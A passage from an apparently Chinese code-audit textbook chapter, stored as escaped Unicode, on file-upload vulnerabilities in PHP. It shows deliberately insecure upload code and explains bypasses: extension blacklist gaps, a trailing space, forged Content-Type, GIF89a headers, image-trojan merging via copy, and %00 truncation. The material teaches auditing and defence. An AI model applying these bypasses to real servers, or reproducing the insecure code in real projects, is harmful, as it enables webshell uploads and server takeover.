\\4.  \u638C\u63E1\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\uFF1B\r
\r
\\5.  \u638C\u63E1\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u7684\u9632\u5FA1\u3002\r
\r
## 8.1 \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u6316\u6398\u4E0E\u5B9E\u8DF5\r
\r
### 8.1.1 \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u7B80\u4ECB\r
\r
\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u5F80\u5F80\u51FA\u73B0\u5728Web\u5E94\u7528\u7684\u4E0A\u4F20\u529F\u80FD\u4E2D\uFF0C\u5982\u679C\u5E94\u7528\u7A0B\u5E8F\u5BF9\u7528\u6237\u4E0A\u4F20\u7684\u6587\u4EF6\u65E0\u8FC7\u6EE4\u529F\u80FD\u6216\u8FC7\u6EE4\u4E0D\u591F\u4E25\u683C\uFF0C\u5C06\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u4EE5\u901A\u8FC7\u8BE5\u6F0F\u6D1E\u4E0A\u4F20\u56FE\u7247\u6728\u9A6C\u3001\u75C5\u6BD2\u7B49\u6709\u5BB3\u6587\u4EF6\uFF0C\u5F53\u6267\u884C\u670D\u52A1\u5668\u5DF2\u4E0A\u4F20\u7684\u6728\u9A6C\u540E\uFF0C\u5C06\u63A7\u5236\u8BE5\u670D\u52A1\u5668\u3002\u8FD1\u51E0\u5E74\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u51FA\u73B0\u7684\u9891\u6B21\u5E76\u4E0D\u9AD8\uFF0C\u8FD9\u4E3B\u8981\u662F\u7531\u4E8E\u76EE\u524D\u6587\u4EF6\u4E0A\u4F20\u529F\u80FD\u8FC7\u4E8E\u5355\u4E00\u4E14\u8FC7\u6EE4\u529F\u80FD\u8F83\u4E3A\u6210\u719F\u3002\r
\r
\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u5371\u5BB3\u6781\u5927\uFF0C\u8FD9\u662F\u56E0\u4E3A\u5229\u7528\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u53EF\u4EE5\u76F4\u63A5\u5C06\u6076\u610F\u4EE3\u7801\u4E0A\u4F20\u81F3\u670D\u52A1\u5668\u4E0A\uFF0C\u53EF\u80FD\u4F1A\u9020\u6210\u670D\u52A1\u5668\u7684\u7F51\u9875\u88AB\u7BE1\u6539\u3001\u7F51\u7AD9\u88AB\u6302\u9A6C\u3001\u670D\u52A1\u5668\u88AB\u8FDC\u7A0B\u63A7\u5236\u3001\u88AB\u5B89\u88C5\u540E\u95E8\u7B49\u4E25\u91CD\u540E\u679C\u3002\r
\r
### 8.1.2 \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C\r
\r
\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u8F83\u4E3A\u7B80\u5355\uFF0C\u4ECE\u7F51\u7AD9\u529F\u80FD\u8FDB\u884C\u5BA1\u8BA1\u800C\u8A00\uFF0C\u7531\u4E8E\u7F51\u7AD9\u4E2D\u4E0A\u4F20\u529F\u80FD\u70B9\u8F83\u5C11\u3002\u540C\u65F6\uFF0C\u5982\u679C\u7F51\u7AD9\u5F00\u53D1\u4F7F\u7528Web\u6846\u67B6\u5BA1\u8BA1\uFF0C\u5176\u6587\u4EF6\u4E0A\u4F20\u6A21\u5757\u901A\u5E38\u90FD\u5C06\u88AB\u5B9A\u4E49\u4E3A\u4E00\u4E2A\u516C\u7528\u7C7B\u8FDB\u884C\u8C03\u7528\uFF0C\u5728\u767D\u76D2\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u53EA\u9700\u5BF9\u6587\u4EF6\u4E0A\u4F20\u516C\u7528\u7C7B\u8FDB\u884C\u5BA1\u8BA1\u5373\u53EF\u3002\r
\r
\u4ECE\u51FD\u6570\u641C\u7D22\u800C\u8A00\uFF0CPHP\u4EE3\u7801\u7684\u6587\u4EF6\u4E0A\u4F20\u51FD\u6570\u4F1A\u4F7F\u7528move_uploaded_file()\u51FD\u6570\uFF0C\u5FEB\u901F\u6316\u6398\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u53EA\u9700\u5168\u5C40\u641C\u7D22\u51FD\u6570\u540D\uFF0C\u5B9A\u4F4D\u9700\u8981\u5BA1\u8BA1\u7684\u4EE3\u7801\u4F4D\u7F6E\uFF0C\u540C\u65F6\u5BA1\u8BA1\u8BE5\u51FD\u6570\u4E0A\u4F20\u6587\u4EF6\u7684\u4EE3\u7801\u662F\u5426\u5B58\u5728\u9650\u5236\u6216\u8FC7\u6EE4\u4E0D\u4E25\u683C\u7684\u60C5\u51B5\u53EF\u7ED5\u8FC7\u3002\r
\r
### 8.1.3 \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u7ED5\u8FC7\r
\r
\u672C\u5C0F\u8282\u5C06\u5BF9\u6587\u4EF6\u4E0A\u4F20\u8FC7\u6EE4\u7684\u7ED5\u8FC7\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\uFF081\uFF09  \u672A\u8FC7\u6EE4\u6216\u672C\u5730\u8FC7\u6EE4\r
\r
\u8BE5\u7C7B\u578B\u6307\u7684\u662F\u672C\u5730\u670D\u52A1\u5668\u672A\u5BF9\u4E0A\u4F20\u6587\u4EF6\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u653B\u51FB\u8005\u53EF\u901A\u8FC7\u6587\u4EF6\u4E0A\u4F20\u529F\u80FD\u4E0A\u4F20PHP\u6076\u610F\u4EE3\u7801\u5E76\u76F4\u63A5\u5229\u7528\uFF0C\u4E0B\u9762\u7ED9\u51FA\u4E0A\u4F20\u6587\u4EF6\u7684\u4EE3\u7801\u6848\u4F8B\uFF1A\r
\r
\r
\r
<?php\r
\r
  move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR. '/' . $_FILES['upload_file']['name'])\r
\r
?>\r
\r
\r
\r
move_uploaded_file(file, newloc)\u51FD\u6570\u4F20\u9012\u4E24\u4E2A\u53C2\u6570\uFF0Cfile\u53C2\u6570\u6307\u8981\u4E0A\u4F20\u7684\u6587\u4EF6\u540D\uFF0Cnewloc\u6307\u89C4\u5B9A\u4E0A\u4F20\u6587\u4EF6\u5B58\u50A8\u7684\u4F4D\u7F6E\u3002\u8BE5\u6587\u4EF6\u5C06\u76F4\u63A5\u628A\u4E0A\u4F20\u7684\u4E34\u65F6\u6587\u4EF6\u62F7\u8D1D\u5230\u65B0\u7684\u6587\u4EF6\u5B58\u50A8\u4F4D\u7F6E\u3002\r
\r
\u5728QYKCMS\u662F\u9752\u4E91\u5BA2\u5F00\u53D1\u7684\u4E00\u6B3E\u8F7B\u91CF\u7EA7\u7F51\u7AD9\u7CFB\u7EDF\uFF0C\u51764.3.2\u7248\u672C\u66FE\u7ECF\u88AB\u53D1\u73B0\u6709\u672A\u8FC7\u6EE4\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
case 'none':\r
\r
//\u6587\u4EF6\u540D\u5C0F\u5199\r
\r
$typename=strtolower(pathinfo($_FILES['file']['name'],PATHINFO_EXTENSION));\r
\r
//\u6587\u4EF6\u540D\u62FC\u63A5\r
\r
$filename=date('dHis').'_'.randomkeys(6).'.'.$typename;\r
\r
//\u6587\u4EF6\u540D\u4E0A\u4F20\u8DEF\u5F84\r
\r
$path='../'.$website['upfolder'].setup_uptemp.$filename;\r
\r
//\u4E0A\u4F20\u6587\u4EF6\r
\r
move_uploaded_file($_FILES['file']['tmp_name'],$path);\r
\r
$res='http://'.$website['setup_weburl'].'/'.$website['upfolder'].setup_uptemp.'|'.$filename;\r
\r
break;\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u4E2D\u5BF9\u4E0A\u4F20\u7684\u6587\u4EF6\u672A\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u4ECE\u800C\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u76F4\u63A5\u6784\u9020\u6728\u9A6C\u6587\u4EF6\u8FDB\u884C\u4E0A\u4F20\u3002\r
\r
\u6709\u4E9B\u5E94\u7528\u4F1A\u4F7F\u7528\u524D\u53F0JS\u4EE3\u7801\u5BF9\u4E0A\u4F20\u6587\u4EF6\u7C7B\u578B\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u4F46\u662F\u540E\u53F0\u670D\u52A1\u5668\u4EE3\u7801\u4F9D\u65E7\u672A\u8FDB\u884C\u8FC7\u6EE4\u3002\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<script type="text/javascript">\r
\r
  function checkFile() {\r
\r
\u200B    var file = document.getElementsByName('upload_file')[0].value;\r
\r
\u200B    var allow_ext = ".jpg|.png|.gif"; //\u5B9A\u4E49\u5141\u8BB8\u4E0A\u4F20\u7684\u6587\u4EF6\u7C7B\u578B\r
\r
\u200B    //\u63D0\u53D6\u4E0A\u4F20\u6587\u4EF6\u7684\u7C7B\u578B\r
\r
\u200B    var ext_name = file.substring(file.lastIndexOf("."));\r
\r
\u200B    //\u5224\u65AD\u4E0A\u4F20\u6587\u4EF6\u7C7B\u578B\u662F\u5426\u5141\u8BB8\u4E0A\u4F20\r
\r
\u200B    if (allow_ext.indexOf(ext_name) == -1) {\r
\r
\u200B      var errMsg = "\u8BE5\u6587\u4EF6\u4E0D\u5141\u8BB8\u4E0A\u4F20\uFF0C\u8BF7\u4E0A\u4F20" + allow_ext + "\u7C7B\u578B\u7684\u6587\u4EF6,\u5F53\u524D\u6587\u4EF6\u7C7B\u578B\u4E3A\uFF1A" + ext_name;\r
\r
\u200B      alert(errMsg);\r
\r
\u200B      return false;}}\r
\r
<\/script>\r
\r
\r
\r
  \u4F46\u662F\u8FD9\u79CD\u524D\u53F0\u4EE3\u7801\u6821\u9A8C\u5F88\u5BB9\u6613\u901A\u8FC7\u6570\u636E\u5305\u62E6\u622A\u8F6C\u53D1\u6216\u4FEE\u6539JS\u4EE3\u7801\u7ED3\u679C\u7684\u65B9\u5F0F\u8FDB\u884C\u7ED5\u8FC7\uFF0C\u4ECE\u800C\u4E0A\u4F20\u6076\u610F\u4EE3\u7801\u6587\u4EF6\uFF0C\u6B64\u7C7B\u578B\u4E5F\u5C06\u662F\u4E00\u79CD\u65E0\u8FC7\u6EE4\u7684\u60C5\u51B5\u3002\r
\r
\uFF082\uFF09  \u9ED1\u540D\u5355\u8FC7\u6EE4\u4E0D\u4E25\u683C\u7ED5\u8FC7\r
\r
\u9ED1\u540D\u5355\u8FC7\u6EE4\u901A\u5E38\u662F\u6307\u7531\u4E8E\u540E\u53F0\u4EE3\u7801\u8FC7\u6EE4\u4E0D\u4E25\u683C\uFF0C\u5BFC\u81F4\u7684\u53EF\u4EE5\u901A\u8FC7\u4FEE\u6539\u6587\u4EF6\u540E\u7F00\u540D\u7ED5\u8FC7\u65B9\u5F0F\u3002\u540E\u53F0\u4EE3\u7801\u7684\u9ED1\u540D\u5355\u8FC7\u6EE4\u901A\u5E38\u5305\u62EC\uFF1A\u6B63\u5219\u8868\u8FBE\u5F0F\u8FC7\u6EE4\u4E0D\u4E25\u683C\uFF0C\u9ED1\u540D\u5355\u6570\u7EC4\u8FC7\u6EE4\u53EF\u7ED5\u8FC7\u3002\r
\r
\u5E38\u89C1\u53EF\u4E0A\u4F20\u6587\u4EF6\u683C\u5F0F\u5982\u88688-1\u6240\u793A\uFF0C\u6BCF\u79CD\u811A\u672C\u8BED\u8A00\u652F\u6301\u7684\u6587\u4EF6\u7C7B\u578B\u90FD\u4E0D\u5C3D\u76F8\u540C\u3002\r
\r
\u88688-1 \u6587\u4EF6\u683C\u5F0F\u540E\u7F00\u8868\r
\r
| **\u811A\u672C\u8BED\u8A00** | **\u6587\u4EF6\u683C\u5F0F\u540E\u7F00**              |\r
| ------------ | ----------------------------- |\r
| Asp\u811A\u672C      | asa\u3001cer\u3001cdx                 |\r
| Aspx\u811A\u672C     | ashx\u3001asmx\u3001ascx              |\r
| Php\u811A\u672C      | php2\u3001php3\u3001php4\u3001php5\u3001phtml |\r
| Jsp\u811A\u672C      | jspx\u3001jspf                    |\r
\r
l \u6B63\u5219\u8868\u8FBE\u5F0F\u8FC7\u6EE4\u4E0D\u4E25\u683C\u6848\u4F8B\uFF1A\r
\r
\r
\r
$savefile=preg_replace("/(php|phtml|php3|php4|jsp|exe|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\\.|$)/i","_\\\\1\\\\2",$savefile);\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u4F7F\u7528\u6B63\u5219\u8868\u8FBE\u5F0F\u5339\u914D\u5E38\u89C1\u7684\u4E0A\u4F20\u6587\u4EF6\u540D\u540E\u7F00\uFF0C\u540C\u65F6\u8FDB\u884C\u5B57\u7B26\u4E32\u66FF\u6362\u64CD\u4F5C\u3002\u4F46\u662F\uFF0C\u6B64\u8FC7\u6EE4\u65B9\u5F0F\u5F88\u5BB9\u9020\u6210\u540E\u7F00\u540D\u8FC7\u6EE4\u4E0D\u4E25\u800C\u5BFC\u81F4\u7ED5\u8FC7\u6B63\u5219\u8868\u8FBE\u5F0F\u7684\u60C5\u51B5\u3002\u4F8B\u5982\uFF0CIIS\u652F\u6301\u7684ASP\u8BED\u8A00\u53EF\u8FD0\u884C\u7684\u811A\u672C\u5305\u62EC\uFF1Aasa\u3001cer\u3001cdx\uFF0C\u4E0A\u8FF0\u6B63\u5219\u8868\u8FBE\u5F0F\u4E2D\u5339\u914D\u540E\u7F00\u5E76\u4E0D\u5B8C\u5168\uFF0C\u5C06\u5BFC\u81F4\u4F7F\u7528.cdx\u811A\u672C\u7ED5\u8FC7\u5B8C\u6210\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u3002\r
\r
l \u9ED1\u540D\u5355\u6570\u7EC4\u8FC7\u6EE4\u7ED5\u8FC7\u6848\u4F8B\uFF1A\r
\r
\r
\r
if (isset($_POST['submit'])) {\r
\r
  if (file_exists($UPLOAD_ADDR)) {\r
\r
\u200B     **$deny_ext** = array('.asp','.aspx','.php','.jsp');\r
\r
\u200B    $file_name = trim($_FILES['upload_file']['name']);\r
\r
\u200B    $file_name = deldot($file_name);//\u5220\u9664\u6587\u4EF6\u540D\u672B\u5C3E\u7684\u70B9\r
\r
**$file_ext** = strtolower($file_ext); //\u8F6C\u6362\u4E3A\u5C0F\u5199\r
\r
\u200B    if(**!in_array($file_ext, $deny_ext)**) {\r
\r
\u200B      if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR. '/' . $_FILES['upload_file']['name'])) {\r
\r
\u200B         $img_path = $UPLOAD_ADDR .'/'. $_FILES['upload_file']['name'];\r
\r
\u200B         $is_upload = true;}\r
\r
\u200B    } else { $msg = '\u4E0D\u5141\u8BB8\u4E0A\u4F20.asp,.aspx,.php,.jsp\u540E\u7F00\u6587\u4EF6\uFF01';}\r
\r
  } else {$msg = $UPLOAD_ADDR . '\u6587\u4EF6\u5939\u4E0D\u5B58\u5728,\u8BF7\u624B\u5DE5\u521B\u5EFA\uFF01';}}\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u9996\u5148\u5B9A\u4E49\u4E86\u9ED1\u540D\u5355\u6570\u7EC4$deny_ext\uFF0C\u7136\u540E\u5BF9\u6587\u4EF6\u540D\u8FDB\u884C\u5904\u7406\u540E\u8D4B\u503C\u7ED9$file_ext\u53D8\u91CF\uFF0C\u968F\u540E\u5224\u65AD$file_ext\u662F\u5426\u5C5E\u4E8E\u9ED1\u540D\u5355\u6570\u7EC4$deny_ext\u4E2D\u7684\u5143\u7D20\uFF0C\u82E5\u4E0D\u5C5E\u4E8E\u8BE5\u6570\u7EC4\u5143\u7D20\u5219\u8FDB\u884C\u6587\u4EF6\u4E0A\u4F20\u3002\u4E0A\u8FF0\u529F\u80FD\u4EE3\u7801\u4E3B\u8981\u5B58\u5728\u4E24\u4E2A\u95EE\u9898\uFF1A\u9ED1\u540D\u5355\u6570\u7EC4\u4E0D\u5B8C\u5168\u53EF\u7ED5\u8FC7\u3001\u9A8C\u8BC1\u6269\u5C55\u540D\u4E0D\u4E25\u683C\u53EF\u7ED5\u8FC7\u3002\r
\r
\u5982\u679C\u4E0A\u4F20\u6587\u4EF6\u7684\u540D\u79F0\u4E3A\u201C1.php \u201D\uFF081.php\u540E\u5B58\u5728\u7A7A\u683C\uFF09\uFF0C\u5219\u53EF\u7ED5\u8FC7in_array()\u51FD\u6570\u5E76\u6210\u529F\u4E0A\u4F20\u6076\u610F\u811A\u672C\u6587\u4EF6\u3002\r
\r
\uFF083\uFF09  Content-Type\u6821\u9A8C\u7ED5\u8FC7\r
\r
Content-Type\u662FHTTP\u534F\u8BAE\u6D88\u606F\u5934\u4E2D\u7684\u4E00\u4E2A\u5B57\u6BB5\uFF0C\u5176\u4E3B\u8981\u7528\u6765\u8868\u793A\u8BF7\u6C42\u4E2D\u7684\u5A92\u4F53\u7C7B\u578B\u4FE1\u606F\uFF0C\u5F88\u591A\u7F51\u7AD9\u540E\u53F0\u4EE3\u7801\u5C06\u5BF9Content-type\u8FDB\u884C\u6821\u9A8C\uFF0C\u4ECE\u800C\u786E\u5B9A\u6587\u4EF6\u4E0A\u4F20\u7684\u7C7B\u578B\u3002\r
\r
\u5E38\u89C1\u6587\u4EF6\u76F8\u5173\u7684Content-type\u7C7B\u578B\u5982\u88688-2\u6240\u793A\u3002\r
\r
\u88688-2 Content-type\u7C7B\u578B\u8868\r
\r
| **Content-type\u7C7B\u578B** | **\u7C7B\u578B\u540D\u79F0** |\r
| -------------------- | ------------ |\r
| text/html            | HTML\u683C\u5F0F     |\r
| image/gif            | gif\u56FE\u7247\u683C\u5F0F  |\r
| image/jpeg           | jpg\u56FE\u7247\u683C\u5F0F  |\r
| image/png            | png\u56FE\u7247\u683C\u5F0F  |\r
| text/plain           | \u7EAF\u6587\u672C\u683C\u5F0F   |\r
| text/xml             | XML\u683C\u5F0F      |\r
\r
Content-Type\u6821\u9A8C\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
if (isset($_POST['submit'])) {\r
\r
  if (file_exists($UPLOAD_ADDR)) {\r
\r
\u200B    if ((**$_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif'**)) {\r
\r
\u200B      if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {\r
\r
\u200B        $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name'];\r
\r
\u200B         $is_upload = true;}\r
\r
\u200B    } else {$msg = '\u6587\u4EF6\u7C7B\u578B\u4E0D\u6B63\u786E\uFF0C\u8BF7\u91CD\u65B0\u4E0A\u4F20\uFF01';}\r
\r
  } else {$msg = $UPLOAD_ADDR.'\u6587\u4EF6\u5939\u4E0D\u5B58\u5728,\u8BF7\u624B\u5DE5\u521B\u5EFA\uFF01';}}\r
\r
\r
\r
  \u4E0A\u8FF0\u4EE3\u7801\u5C06\u5BF9\u4E0D\u540C\u7684Content-Type\u8FDB\u884C\u6821\u9A8C\uFF0C\u5176\u4E2D\u5305\u62EC\uFF1Agif\u3001png\u3001jpg\u683C\u5F0F\uFF0C\u540E\u53F0\u5C06\u5BF9\u5176Content-Type\u5224\u65AD\u4ECE\u800C\u786E\u5B9A\u6587\u4EF6\u662F\u5426\u5141\u8BB8\u4E0A\u4F20\u3002\u4F46\u662FContent-Type\u5B57\u6BB5\u53EF\u4EE5\u901A\u8FC7BurpSuite\u6570\u636E\u5305\u6293\u53D6\u8FDB\u884C\u7BE1\u6539\uFF0C\u8FD9\u6837\u5C31\u53EF\u4EE5\u7ED5\u8FC7\u8BE5\u8FC7\u6EE4\u65B9\u5F0F\u3002\r
\r
  Web\u7F51\u7AD9\u4E2D\u4E0A\u4F20test.php\u6587\u4EF6\u5185\u5BB9\u4E3A<?php phpinfo();?>\uFF0C\u7136\u540E\u4F7F\u7528BurpSuite\u62E6\u622A\u6570\u636E\u5305\u5982\u56FE8-1\u6240\u793A\uFF0C\u5C06\u6293\u53D6\u7684\u6570\u636E\u5305Content-Type\u4E2Dapplication/octet-stream\u4FEE\u6539\u4E3Aimage/gif\uFF0C\u4ECE\u800C\u4E0A\u4F20PHP\u6076\u610F\u4EE3\u7801\u6587\u4EF6\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image418.jpg)\r
\r
\u56FE8-1 \u6570\u636E\u5305\u4FEE\u6539\u56FE\r
\r
\uFF084\uFF09  \u6587\u4EF6\u5934\u8FC7\u6EE4\u7ED5\u8FC7\r
\r
\u5404\u79CD\u6587\u4EF6\u90FD\u6709\u7279\u5B9A\u7684\u6587\u4EF6\u5934\u683C\u5F0F\uFF0C\u7A0B\u5E8F\u5728\u5F00\u53D1\u8FC7\u7A0B\u4E2D\uFF0C\u5F00\u53D1\u8005\u53EF\u901A\u8FC7\u6821\u9A8C\u4E0A\u4F20\u6587\u4EF6\u7684\u6587\u4EF6\u5934\u68C0\u6D4B\u6587\u4EF6\u7C7B\u578B\uFF0C\u5E38\u89C1\u7684\u6587\u4EF6\u5934\u683C\u5F0F\u5982\u88688-3\u6240\u793A\u3002\r
\r
\u88688-3 \u56FE\u7247\u6587\u4EF6\u5934\u8868\r
\r
| **\u56FE\u7247\u7C7B\u578B** | **\u6587\u4EF6\u5934\u683C\u5F0F**              |\r
| ------------ | --------------------------- |\r
| JPEG\u56FE\u7247     | 0xFFD8FF                    |\r
| PNG\u56FE\u7247      | 0x89504E470D0A1A0A          |\r
| GIF\u56FE\u7247      | 47 49 46 38 39 61\uFF08GIF89a\uFF09 |\r
\r
\u4F46\u662F\u8FD9\u79CD\u6821\u9A8C\u65B9\u5F0F\u4E5F\u53EF\u4EE5\u88AB\u7ED5\u8FC7\uFF0C\u5176\u4E3B\u8981\u901A\u8FC7\u5728\u6728\u9A6C\u6587\u4EF6\u5934\u90E8\u6DFB\u52A0\u5BF9\u5E94\u7684\u6587\u4EF6\u5934\uFF0C\u8FD9\u6837\u65E2\u53EF\u4EE5\u7ED5\u8FC7\u6B64\u7C7B\u65B9\u5F0F\u7684\u6821\u9A8C\uFF0C\u53C8\u4E0D\u5F71\u54CD\u8BE5\u6728\u9A6C\u6587\u4EF6\u7684\u6B63\u5E38\u8FD0\u884C\u3002\r
\r
\u6587\u4EF6\u5934\u6821\u9A8C\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
function isImage($filename){\r
\r
  $types = '.jpeg|.png|.gif';\r
\r
  if(file_exists($filename)){\r
\r
\u200B    $info = getimagesize($filename);\r
\r
\u200B    $ext = image_type_to_extension($info[2]);\r
\r
\u200B    if(stripos($types,$ext)){return $ext;\r
\r
\u200B    }else{return false;\r
\r
\u200B    }}else{return false;}}\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u4F7F\u7528getimagesize\u51FD\u6570\u83B7\u53D6\u6587\u4EF6\u7C7B\u578B\uFF0C\u5E76\u4F7F\u7528image_type_to_extension\u51FD\u6570\u83B7\u5F97\u5BF9\u5E94\u6587\u4EF6\u683C\u5F0F\uFF0C\u5728\u901A\u8FC7stripos\u51FD\u6570\u5224\u65AD\u8BE5\u6587\u4EF6\u7684\u662F\u5426\u4E3Ajpeg\u3001png\u3001gif\u3002\r
\r
\u5176\u4E2Dgetimagesize\u51FD\u6570\u7528\u4E8E\u83B7\u53D6\u56FE\u50CF\u5927\u5C0F\u53CA\u76F8\u5173\u4FE1\u606F\uFF0C\u6210\u529F\u8FD4\u56DE\u4E00\u4E2A\u6570\u7EC4\uFF0C\u5931\u8D25\u5219\u8FD4\u56DE FALSE \u5E76\u4EA7\u751F\u4E00\u6761E_WARNING\u7EA7\u7684\u9519\u8BEF\u4FE1\u606F\uFF0C\u8BE5\u51FD\u6570\u4E3B\u8981\u7684\u68C0\u67E5\u6587\u4EF6\u683C\u5F0F\u65B9\u5F0F\u662F\u901A\u8FC7\u6587\u4EF6\u5934\u7684\u65B9\u5F0F\u83B7\u53D6\u6587\u4EF6\u7C7B\u578B\u3002\r
\r
l \u4FEE\u6539\u6587\u4EF6\u5934\u7ED5\u8FC7\r
\r
\u5F88\u591A\u6076\u610F\u4E0A\u4F20\u6587\u4EF6\u53EF\u901A\u8FC7\u4FEE\u6539\u6587\u4EF6\u5934\u7684\u65B9\u5F0F\u8BEF\u5BFCgetimagesize\u51FD\u6570\uFF0C\u4ECE\u800C\u4EE4\u8BE5\u51FD\u6570\u5224\u5B9A\u4E0A\u4F20\u6587\u4EF6\u4E3A\u56FE\u7247\u683C\u5F0F\uFF0C\u901A\u8FC7\u5728PHP\u6587\u4EF6\u5934\u4E2D\u6DFB\u52A0\u201CGIF89a\u201D\u53EF\u4F7Fgetimagesize\u51FD\u6570\u8BEF\u8BA4\u4E3A\u8BE5PHP\u6587\u4EF6\u4E3Agif\u56FE\u7247\uFF0C\u4ECE\u800C\u7ED5\u8FC7\u68C0\u6D4B\u3002\r
\r
l \u5236\u4F5C\u56FE\u7247\u6728\u9A6C\u7ED5\u8FC7\r
\r
\u53EF\u51C6\u5907\u4E24\u4E2A\u6587\u4EF6\uFF0C\u5206\u522B\u662F\u6B63\u5E38\u56FE\u7247a.jpg\u3001\u6728\u9A6C\u4EE3\u7801a.txt\u5185\u5BB9\u4E3A<?php phpinfo();?>\u3002\u901A\u8FC7\u4F7F\u7528copy\u547D\u4EE4\u5C06\u4E24\u4E2A\u6587\u4EF6\u8FDB\u884C\u5408\u5E76\u5230test.php\u6587\u4EF6\u4E2D\uFF0C\u8FD9\u6837\u8BE5\u6587\u4EF6\u5C06\u662F\u4E00\u4E2A\u5E26\u6709\u56FE\u7247\u5934\u6807\u8BC6\u7684\u56FE\u7247\u6728\u9A6C\uFF0C\u4ECE\u800C\u6210\u529F\u7ED5\u8FC7getimagesize\u51FD\u6570\u68C0\u6D4B\u6210\u529F\u4E0A\u4F20\u56FE\u7247\u6728\u9A6C\u3002\r
\r
\r
\r
copy\u547D\u4EE4\u4E3A\uFF1Acopy a.jpg/b + a.txt/a test.php\r
\r
\r
\r
\uFF085\uFF09  \u6587\u4EF6\u622A\u65AD%00\u4E0A\u4F20\u7ED5\u8FC7\u767D\u540D\u5355\r
\r
\u6587\u4EF6\u622A\u65AD\u4E0A\u4F20\u6F0F\u6D1E\u7684\u4E3B\u8981\u539F\u56E0\u662F\u5B58\u5728%00\u5B57\u7B26\uFF0C\u5F53PHP\u7684\u7248\u672C\u4F4E\u4E8E5.3.4\u4E14magic_quotes_gpc\u4E3Aoff\u7684\u72B6\u6001\u65F6\uFF0C\u5E26\u6709%00\u5B57\u7B26\u5C06\u88AB\u7A0B\u5E8F\u8BC6\u522B\u4E3A\u7ED3\u675F\u7B26\uFF0C\u4ECE\u800C\u8BE5\u5B57\u7B26\u540E\u7684\u6570\u636E\u76F4\u63A5\u88AB\u5FFD\u7565\uFF0C\u9020\u6210\u6587\u4EF6\u4E0A\u4F20\u88AB\u622A\u65AD\u7684\u60C5\u51B5\u3002\u4E0A\u4F20\u65F6\u5982\u679C\u4E0A\u4F20\u7684\u6587\u4EF6\u8DEF\u5F84\u53EF\u63A7\uFF0C\u5373\u53EF\u901A\u8FC7%00\u622A\u65AD\u8FDB\u884C\u6728\u9A6C\u4E0A\u4F20\u3002\r
\r
\u6587\u4EF6\u622A\u65AD\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
if(isset($_POST['submit'])){\r
\r
  $ext_arr = array('jpg','png','gif');\r
\r
  $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);\r
\r
  if(in_array($file_ext,$ext_arr)){\r
\r
\u200B    $temp_file = $_FILES['upload_file']['tmp_name'];\r
\r
\u200B    **$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;**\r
\r
\u200B    if(move_uploaded_file($temp_file,$img_path)){$is_upload = true; }\r
\r
\u200B    else{$msg = '\u4E0A\u4F20\u5931\u8D25\uFF01';}}\r
\r
  else{$msg = "\u53EA\u5141\u8BB8\u4E0A\u4F20.jpg|.png|.gif\u7C7B\u578B\u6587\u4EF6\uFF01";}}\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u4E2D\uFF0C\u9996\u5148\u4F7F\u7528\u767D\u540D\u5355\u6570\u7EC4\u8FDB\u884C\u6821\u9A8C\uFF0C\u7136\u540E\u5F53\u4E3A\u6587\u4EF6\u8FDB\u884C\u4FDD\u5B58\u4E4B\u524D\uFF0C\u76F4\u63A5\u62FC\u63A5\u4FDD\u5B58\u6587\u4EF6\u8DEF\u5F84\uFF0C\u6B64\u5904\u53EF\u4F7F\u7528%00\u622A\u65AD\u7684\u65B9\u5F0F\u62FC\u63A5\u6587\u4EF6\u4FDD\u5B58\u4F4D\u7F6E\u5E76\u5C06\u4E0A\u4F20\u56FE\u7247\u4FEE\u6539\u4E3APHP\u53EF\u6267\u884C\u6587\u4EF6\u3002\r
\r
